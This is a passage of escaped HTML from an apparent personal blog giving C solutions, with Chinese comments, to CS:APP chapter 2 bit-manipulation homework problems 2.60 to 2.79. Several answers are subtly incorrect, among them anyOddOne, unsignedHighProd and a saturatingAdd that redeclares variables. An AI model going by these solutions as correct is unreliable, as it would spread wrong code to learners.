class=\"number\">-1</span>)&lt;&lt;<span class=\"number\">8</span>)|(y&amp;<span class=\"number\">0xFF</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-60\"><a href=\"#2-60\" class=\"headerlink\" title=\"2.60\"></a>2.60</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">replaceByte</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x, <span class=\"keyword\">int</span> i, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = ~<span class=\"number\">0</span> - ((<span class=\"number\">1L</span>L&lt;&lt;(i+<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">3</span>))-(<span class=\"number\">1</span>&lt;&lt;(i&lt;&lt;<span class=\"number\">3</span>)));</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&amp;t|((<span class=\"keyword\">unsigned</span>)b&lt;&lt;(i&lt;&lt;<span class=\"number\">3</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-61\"><a href=\"#2-61\" class=\"headerlink\" title=\"2.61\"></a>2.61</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">A2_61</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !(x^~<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">B2_61</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !x;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">C2_61</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !((x&amp;<span class=\"number\">0xFF</span>)^<span class=\"number\">0xFF</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">D2_61</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !((<span class=\"keyword\">unsigned</span>)x&gt;&gt;((<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)<span class=\"number\">-1</span>)&lt;&lt;<span class=\"number\">3</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-62\"><a href=\"#2-62\" class=\"headerlink\" title=\"2.62\"></a>2.62</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isRightShiftAreArithmetic</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> x = <span class=\"number\">-1</span>&gt;&gt;<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x==<span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-63\"><a href=\"#2-63\" class=\"headerlink\" title=\"2.63\"></a>2.63</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">srl</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> xsra = (<span class=\"keyword\">int</span>)x&gt;&gt;k;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> xsra&amp;(<span class=\"number\">1</span>&lt;&lt;(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)-k)<span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sra</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> xsrl = (<span class=\"keyword\">unsigned</span>)x&gt;&gt;k;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = ~<span class=\"number\">0</span>-(<span class=\"number\">1</span>&lt;&lt;k)+<span class=\"number\">1</span> &amp; x&gt;&gt;((<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> t|xsrl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-64\"><a href=\"#2-64\" class=\"headerlink\" title=\"2.64\"></a>2.64</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//题目中没有说bit从0开始计数还是从1开始，此处默认从0开始</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">anyOddOne</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (x&amp;<span class=\"number\">0xaaaaaaaa</span>)==<span class=\"number\">0xaaaaaaaa</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-65\"><a href=\"#2-65\" class=\"headerlink\" title=\"2.65\"></a>2.65</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">oddOnesV1</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//思路，用xor消掉成对的1，不成对的记录下来</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">4</span>;</span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">2</span>;</span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&gt;&gt;<span class=\"number\">31</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">oddOnesV2</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//思路与上一个函数类似</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">1</span>;\t<span class=\"comment\">//思考的时候只考虑奇数位，不需要考虑偶数位（从1开始计数bit位）</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">2</span>;\t<span class=\"comment\">//只考虑mod4==0的位置</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">4</span>;\t<span class=\"comment\">//只考虑mod8==0的位置</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">8</span>;\t<span class=\"comment\">//只考虑mod16==0的位置</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">16</span>;\t<span class=\"comment\">//只考虑mod32==0的位置</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&gt;&gt;<span class=\"number\">31</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-66\"><a href=\"#2-66\" class=\"headerlink\" title=\"2.66\"></a>2.66</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">leftMostOne</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">1</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">2</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">4</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x-(x&gt;&gt;<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-67\"><a href=\"#2-67\" class=\"headerlink\" title=\"2.67\"></a>2.67</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">intSizeIs32</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> INT_MAX==<span class=\"number\">0x80000000</span><span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-68\"><a href=\"#2-68\" class=\"headerlink\" title=\"2.68\"></a>2.68</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">lowerOneMark</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = -!(n-(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>));\t<span class=\"comment\">//方法1</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"number\">1</span>&lt;&lt;n)<span class=\"number\">-1</span>&amp;~t | t;</span><br><span class=\"line\"><span class=\"comment\">//\treturn ((n!=(sizeof(int)&lt;&lt;3))&lt;&lt;n)-1;\t//方法2</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-69\"><a href=\"#2-69\" class=\"headerlink\" title=\"2.69\"></a>2.69</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">rotateLeft</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x, <span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//移位sizeof*8不行，但是移位sizeof*8-1再移位1就可行了，上一题也可以这样搞</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&gt;&gt;((<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">unsigned</span>)&lt;&lt;<span class=\"number\">3</span>)-n<span class=\"number\">-1</span>)&gt;&gt;<span class=\"number\">1</span> | x&lt;&lt;n;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-70\"><a href=\"#2-70\" class=\"headerlink\" title=\"2.70\"></a>2.70</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fitBits</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&gt;&gt;n<span class=\"number\">-1</span>==<span class=\"number\">0</span> | x&gt;&gt;n<span class=\"number\">-1</span>==<span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-71\"><a href=\"#2-71\" class=\"headerlink\" title=\"2.71\"></a>2.71</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">unsigned</span> <span class=\"keyword\">pack_t</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">xbyte</span><span class=\"params\">(<span class=\"keyword\">pack_t</span> word, <span class=\"keyword\">int</span> bytenum)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"keyword\">int</span>)word&lt;&lt;(<span class=\"number\">3</span>-bytenum&lt;&lt;<span class=\"number\">3</span>)&gt;&gt;<span class=\"number\">24</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-73\"><a href=\"#2-73\" class=\"headerlink\" title=\"2.73\"></a>2.73</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">saturatingAdd</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//方法一</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = (<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> p = ((<span class=\"keyword\">unsigned</span>)x&gt;&gt;t)+((<span class=\"keyword\">unsigned</span>)y&gt;&gt;t)+((<span class=\"keyword\">unsigned</span>)x+y&gt;&gt;t);</span><br><span class=\"line\">\tt = ((<span class=\"keyword\">unsigned</span>)x&gt;&gt;t)+((<span class=\"keyword\">unsigned</span>)y&gt;&gt;t);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -(p==<span class=\"number\">2</span>&amp;&amp;t!=<span class=\"number\">1</span>)&amp;INT_MIN | -(p==<span class=\"number\">1</span>&amp;&amp;t!=<span class=\"number\">1</span>)&amp;INT_MAX | -(p==<span class=\"number\">0</span>||t==<span class=\"number\">1</span>)&amp;x+y | -(p==<span class=\"number\">3</span>||t==<span class=\"number\">1</span>)&amp;x+y;</span><br><span class=\"line\">  </span><br><span class=\"line\">\t<span class=\"comment\">//方法二</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = (<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> p = ((<span class=\"keyword\">unsigned</span>)x&gt;&gt;t&lt;&lt;<span class=\"number\">2</span>)|((<span class=\"keyword\">unsigned</span>)y&gt;&gt;t&lt;&lt;<span class=\"number\">1</span>)|((<span class=\"keyword\">unsigned</span>)x+y&gt;&gt;t);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -(p==<span class=\"number\">6</span>)&amp;INT_MIN | -(p==<span class=\"number\">1</span>)&amp;INT_MAX | -(p!=<span class=\"number\">1</span>&amp;&amp;p!=<span class=\"number\">6</span>)&amp;x+y;</span><br><span class=\"line\">  </span><br><span class=\"line\">\t<span class=\"comment\">//方法三（from http://blog.csdn.net/yang_f_k/article/details/8857904）</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> w=<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> sum = x+y;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mask = <span class=\"number\">1</span>&lt;&lt;(w<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> x_lmb = x&amp;mask;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> y_lmb = y&amp;mask;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> sum_lmb = sum&amp;mask;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> neg_of = x_lmb &amp;&amp; y_lmb &amp;&amp; (!sum_lmb);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> pos_of = !x_lmb &amp;&amp; !y_lmb &amp;&amp; sum_lmb;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t(pos_of &amp;&amp;(sum=INT_MAX)) || (neg_of &amp;&amp; (sum = INT_MIN)); <span class=\"comment\">//这一条不错</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-74\"><a href=\"#2-74\" class=\"headerlink\" title=\"2.74\"></a>2.74</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">tsubOk</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = (<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> p = (<span class=\"keyword\">unsigned</span>)x&gt;&gt;t&lt;&lt;<span class=\"number\">2</span> | (<span class=\"keyword\">unsigned</span>)-y&gt;&gt;t&lt;&lt;<span class=\"number\">1</span> | (<span class=\"keyword\">unsigned</span>)x-y&gt;&gt;t;</span><br><span class=\"line\">\tt = y==INT_MIN;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p!=<span class=\"number\">6</span> &amp;&amp; p!=<span class=\"number\">1</span> &amp;&amp; !t || t &amp;&amp; p==<span class=\"number\">6</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-75\"><a href=\"#2-75\" class=\"headerlink\" title=\"2.75\"></a>2.75</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">unsignedHightProd</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x, <span class=\"keyword\">unsigned</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> t = signed_high_prod(x, y);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> l = (<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> t + (x&gt;&gt;l)*x+(y&gt;&gt;l)*y;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-76\"><a href=\"#2-76\" class=\"headerlink\" title=\"2.76\"></a>2.76</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span>* <span class=\"title\">Calloc</span><span class=\"params\">(<span class=\"keyword\">size_t</span> nmemb, <span class=\"keyword\">size_t</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">size_t</span> t = nmemb*size;</span><br><span class=\"line\">\t<span class=\"keyword\">void</span> *p;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!size || t/size==nmemb)&#123;</span><br><span class=\"line\">\t\tp = <span class=\"built_in\">malloc</span>(t);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!p)<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(p, <span class=\"number\">0</span>, t);</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-77\"><a href=\"#2-77\" class=\"headerlink\" title=\"2.77\"></a>2.77</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f2_77</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> k1 = (x&lt;&lt;<span class=\"number\">4</span>)+x;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> k2 = -(x&lt;&lt;<span class=\"number\">3</span>)+x;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> k3 = (x&lt;&lt;<span class=\"number\">6</span>)-(x&lt;&lt;<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> k4 = -(x&lt;&lt;<span class=\"number\">7</span>)+(x&lt;&lt;<span class=\"number\">4</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (k1==x*<span class=\"number\">17</span>)&lt;&lt;<span class=\"number\">3</span> | (k2==x*<span class=\"number\">-7</span>)&lt;&lt;<span class=\"number\">2</span> | (k3==x*<span class=\"number\">60</span>)&lt;&lt;<span class=\"number\">1</span> | k4==x*<span class=\"number\">-112</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-78\"><a href=\"#2-78\" class=\"headerlink\" title=\"2.78\"></a>2.78</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">dividePower2</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> l = <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>;</span><br><span class=\"line\">\tl = -(x&gt;&gt;l<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (l&lt;&lt;k)-l+x &gt;&gt; k;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-79\"><a href=\"#2-79\" class=\"headerlink\" title=\"2.79\"></a>2.79</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">mul3div4</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tx = (x&lt;&lt;<span class=\"number\">2</span>) - x;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> l = <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>;</span><br><span 